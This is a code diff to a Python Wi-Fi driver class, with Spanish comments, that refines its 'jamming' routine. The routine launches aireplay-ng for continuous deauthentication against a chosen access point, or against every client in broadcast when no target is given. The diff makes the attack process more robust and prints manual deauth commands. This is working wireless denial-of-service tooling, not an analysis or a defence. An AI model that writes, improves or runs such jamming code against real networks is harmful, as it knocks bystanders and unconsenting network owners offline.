@@ -861,7 +861,7 @@ class WiFiDriver:
                 # Usar aireplay-ng para deauth attack
                 # Nota: Si ya estamos ejecutando con sudo, no necesitamos sudo en el comando
                 import os
-                if os.geteuid() == 0:
+                if hasattr(os, 'geteuid') and os.geteuid() == 0:
                     # Ya estamos como root, no usar sudo
                     cmd = ['aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                 else:
@@ -870,39 +870,60 @@ class WiFiDriver:
                 
                 print(f"Iniciando jamming en {interface}...")
                 
-                # Ejecutar en background
+                # Ejecutar en background con mejor manejo
                 try:
-                    self.jam_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    # Usar preexec_fn para evitar procesos zombie
+                    self.jam_process = subprocess.Popen(
+                        cmd, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE,
+                        preexec_fn=os.setsid if hasattr(os, 'setsid') else None
+                    )
                 except Exception as e:
                     print(f"ERROR ejecutando aireplay-ng: {e}")
                     return False
                 
                 # Verificar que inició correctamente
-                time.sleep(1.0)  # Más tiempo para que inicie
+                time.sleep(1.5)  # Más tiempo para que inicie y muestre errores
                 
                 if self.jam_process.poll() is not None:
-                    # Proceso terminó prematuramente
-                    stdout = self.jam_process.stdout.read().decode('utf-8', errors='ignore') if self.jam_process.stdout else ""
-                    stderr = self.jam_process.stderr.read().decode('utf-8', errors='ignore') if self.jam_process.stderr else ""
+                    # Proceso terminó prematuramente - leer salida completa
+                    try:
+                        stdout, stderr = self.jam_process.communicate(timeout=1)
+                        stdout = stdout.decode('utf-8', errors='ignore') if stdout else ""
+                        stderr = stderr.decode('utf-8', errors='ignore') if stderr else ""
+                    except:
+                        stdout = ""
+                        stderr = ""
                     
-                    print(f"ERROR: aireplay-ng terminó inmediatamente.")
+                    print(f"\nERROR: aireplay-ng terminó inmediatamente (código: {self.jam_process.returncode})")
                     if stdout:
-                        print(f"STDOUT: {stdout}")
+                        print(f"STDOUT:\n{stdout}")
                     if stderr:
-                        print(f"STDERR: {stderr}")
+                        print(f"STDERR:\n{stderr}")
                     
                     # Diagnóstico adicional
                     print(f"\nDiagnóstico:")
                     print(f"  - Interfaz: {interface}")
                     print(f"  - Modo monitor: {self.monitor_mode}")
                     print(f"  - Canal actual: {self.current_channel}")
-                    print(f"  - Verifica con: sudo aireplay-ng --test {interface}")
+                    print(f"  - BSSID objetivo: {target_bssid or 'Broadcast'}")
+                    print(f"\nPrueba manualmente:")
+                    print(f"  sudo aireplay-ng --test {interface}")
+                    print(f"  sudo aireplay-ng --deauth 5 -a {target_bssid or 'FF:FF:FF:FF:FF:FF'} {interface}")
+                    
+                    # Limpiar proceso zombie
+                    try:
+                        self.jam_process.wait(timeout=1)
+                    except:
+                        pass
                     
                     return False
                 
                 # Verificar que el proceso realmente esté corriendo
                 print(f"Jamming iniciado (PID: {self.jam_process.pid})")
                 print(f"Verifica con: ps aux | grep {self.jam_process.pid}")
+                print(f"Para detener: jam (de nuevo) o x")
                 
                 return True
             
@@ -1027,12 +1048,25 @@ class WiFiDriver:
             
             # Detener proceso de jamming normal
             if hasattr(self, 'jam_process') and self.jam_process:
-                self.jam_process.terminate()
                 try:
-                    self.jam_process.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    self.jam_process.kill()
-                    self.jam_process.wait()
+                    # Intentar terminar suavemente
+                    self.jam_process.terminate()
+                    try:
+                        self.jam_process.wait(timeout=2)
+                    except subprocess.TimeoutExpired:
+                        # Si no termina, forzar
+                        self.jam_process.kill()
+                        self.jam_process.wait(timeout=1)
+                except (ProcessLookupError, ValueError):
+                    # Proceso ya terminó
+                    pass
+                except Exception as e:
+                    # Otro error, intentar kill
+                    try:
+                        self.jam_process.kill()
+                        self.jam_process.wait(timeout=1)
+                    except:
+                        pass
         except Exception as e:
             print(f"Advertencia al detener jamming: {e}")
     
